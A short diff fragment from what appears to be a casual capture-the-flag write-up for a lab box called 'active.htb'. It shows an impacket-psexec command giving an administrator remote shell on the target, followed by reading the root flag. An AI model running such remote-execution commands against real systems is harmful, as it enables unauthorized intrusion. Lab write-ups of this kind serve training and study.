@@ -326,3 +326,8 @@ cool.
 now uh. root flag incoming.
 
 	impacket-psexec administrator@active.htb
+
+C:\Users\Administrator\Desktop> type root.txt
+
+
+yay! done :)
